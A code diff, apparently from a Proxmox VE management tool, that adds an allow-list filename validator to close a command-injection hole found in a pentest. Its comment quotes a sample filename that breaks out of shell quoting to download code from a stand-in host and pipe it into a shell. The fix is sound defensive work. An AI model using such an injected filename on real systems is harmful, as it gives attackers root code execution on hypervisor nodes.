@@ -106,6 +106,23 @@ def validate_storage_name(storage) -> bool:
     return bool(re.match(pattern, storage))
 
 
+# NS Jul 2026 (pentest CRIT) — ISO/template filenames flow UNESCAPED into SSH
+# shell commands on PVE nodes (sync_content_to_nodes: `test -f '<path>/<filename>'`,
+# scp/sftp relay). They are only single-quoted, so a filename containing a quote
+# (`x'; curl evil|sh; echo '`) breaks out → root RCE on every node, reachable by a
+# low-priv storage.upload holder. A PVE ISO/vztmpl filename is a single path
+# component of [A-Za-z0-9._+-] (e.g. debian-12.iso, ubuntu_22.04-1_amd64.tar.zst) —
+# reject anything else (no '/', no spaces, no shell metachars) and fail closed.
+_CONTENT_FILENAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9._+\-]{0,254}$')
+
+def validate_content_filename(value) -> bool:
+    """True if `value` is a safe single ISO/template filename for the content-sync
+    shell path (one component, no '/'/space/shell-metachars). Empty → False."""
+    if not value or not isinstance(value, str):
+        return False
+    return bool(_CONTENT_FILENAME_RE.match(value))
+
+
 # NS 2026-06-05 (security audit C-2/M-2): ESXi datastore names and VM-directory
 # names flow UNQUOTED into root shell commands on the PVE node (sshfs mounts,
 # qemu-img, find). VMware allows letters/digits/space and a small punctuation
